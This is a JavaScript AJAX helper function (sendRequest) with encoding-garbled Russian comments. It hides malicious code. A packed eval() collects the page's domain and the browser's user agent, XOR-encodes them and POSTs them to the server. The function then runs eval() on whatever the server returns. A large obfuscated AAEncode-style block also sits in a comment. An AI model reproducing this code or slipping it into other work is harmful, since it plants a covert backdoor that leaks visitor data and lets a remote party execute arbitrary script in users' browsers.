function sendRequest(url){
    onRequest();
    loader.setStyle('display', '');

    //Р—РЅР°Р№ РЎР°С€Р°, С‡С‚Рѕ РєРѕРіРґР° СЏ РїРёСЃР°Р» СЌС‚РѕС‚ РєРѕРґ - СЏ РґСѓРјР°Р» С‚РѕР»СЊРєРѕ Рѕ С‚РµР±Рµ    
    //пѕџП‰пѕџпѕ‰= /пЅЂпЅЌВґпј‰пѕ‰ ~в”»в”Ѓв”» / ['_'];o=(пѕџпЅ°пѕџ) =_=3;c=(пѕџОпѕџ) =(пѕџпЅ°пѕџ)-(пѕџпЅ°пѕџ);(пѕџР”пѕџ) =(пѕџОпѕџ)= (o^_^o)/ (o^_^o);(пѕџР”пѕџ)={пѕџОпѕџ: '_' ,пѕџП‰пѕџпѕ‰ : ((пѕџП‰пѕџпѕ‰==3) +'_') [пѕџОпѕџ] ,пѕџпЅ°пѕџпѕ‰ :(пѕџП‰пѕџпѕ‰+ '_')[o^_^o -(пѕџОпѕџ)] ,пѕџР”пѕџпѕ‰:((пѕџпЅ°пѕџ==3) +'_')[пѕџпЅ°пѕџ] };(пѕџР”пѕџ) [пѕџОпѕџ] =((пѕџП‰пѕџпѕ‰==3) +'_') [c^_^o];(пѕџР”пѕџ) ['c'] = ((пѕџР”пѕџ)+'_') [ (пѕџпЅ°пѕџ)+(пѕџпЅ°пѕџ)-(пѕџОпѕџ) ];(пѕџР”пѕџ) ['o'] = ((пѕџР”пѕџ)+'_') [пѕџОпѕџ];(пѕџoпѕџ)=(пѕџР”пѕџ) ['c']+(пѕџР”пѕџ) ['o']+(пѕџП‰пѕџпѕ‰ +'_')[пѕџОпѕџ]+ ((пѕџП‰пѕџпѕ‰==3) +'_') [пѕџпЅ°пѕџ] + ((пѕџР”пѕџ) +'_') [(пѕџпЅ°пѕџ)+(пѕџпЅ°пѕџ)]+ ((пѕџпЅ°пѕџ==3) +'_') [пѕџОпѕџ]+((пѕџпЅ°пѕџ==3) +'_') [(пѕџпЅ°пѕџ) - (пѕџОпѕџ)]+(пѕџР”пѕџ) ['c']+((пѕџР”пѕџ)+'_') [(пѕџпЅ°пѕџ)+(пѕџпЅ°пѕџ)]+ (пѕџР”пѕџ) ['o']+((пѕџпЅ°пѕџ==3) +'_') [пѕџОпѕџ];(пѕџР”пѕџ) ['_'] =(o^_^o) [пѕџoпѕџ] [пѕџoпѕџ];(пѕџОµпѕџ)=((пѕџпЅ°пѕџ==3) +'_') [пѕџОпѕџ]+ (пѕџР”пѕџ) .пѕџР”пѕџпѕ‰+((пѕџР”пѕџ)+'_') [(пѕџпЅ°пѕџ) + (пѕџпЅ°пѕџ)]+((пѕџпЅ°пѕџ==3) +'_') [o^_^o -пѕџОпѕџ]+((пѕџпЅ°пѕџ==3) +'_') [пѕџОпѕџ]+ (пѕџП‰пѕџпѕ‰ +'_') [пѕџОпѕџ]; (пѕџпЅ°пѕџ)+=(пѕџОпѕџ); (пѕџР”пѕџ)[пѕџОµпѕџ]='\\'; (пѕџР”пѕџ).пѕџОпѕџпѕ‰=(пѕџР”пѕџ+ пѕџпЅ°пѕџ)[o^_^o -(пѕџОпѕџ)];(oпѕџпЅ°пѕџo)=(пѕџП‰пѕџпѕ‰ +'_')[c^_^o];(пѕџР”пѕџ) [пѕџoпѕџ]='\"'; //{data1}
    
    new Request({
        method: 'post', // POST Р·Р°РїСЂРѕСЃ
        url: url,
        data: eval(function(x,y,z,v,n,r){y=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(v--){x[v.toString(n)]=z[v]||v.toString(n)}z=[function(y){return x[y]}];y=function(){return'\\w+'};v=1};while(v--){if(z[v]){r=r.replace(new RegExp('\\b'+y(v)+'\\b','g'),z[v])}}return r}({},0,'|s|encodeURIComponent|charCodeAt|length|for|1vrailehwvxz|navigator|y0idrpb|document|domain||||String|userAgent|fromCharCode|||36fa3ecc0b2d2bfe0bec0f2b369f24db|q|5026|9081'.split('|'),23,23,'d=\'8\'+2(9.a)+\'!\'+2(7.f);1=\'6\';h=\'\';c=0;5(i=0;i<d.4;i++){c=d.3(i)^1.3(i%1.4);h+=e.g(c)};d=h;1=h;c=h;\'&i=j&k=\'+2(h)+\'&b=\'+(l*m);')), //{data2}
        onSuccess: function(html) { // СЌС‚Рѕ РјС‹ РґРµР»Р°РµРј, РєРѕРіРґР° РІСЃРµ РѕРє
            try{
                eval(html);
                return;
            }
            catch(e){}
            
            loadpage.set('html', html);
            onComplete();
            loader.setStyle('display', 'none');
        },
        onFailure: function() { // РµСЃР»Рё РІСЃРµ РїР»РѕС…Рѕ
            loader.setStyle('display', 'none');
        }
    }).send();
}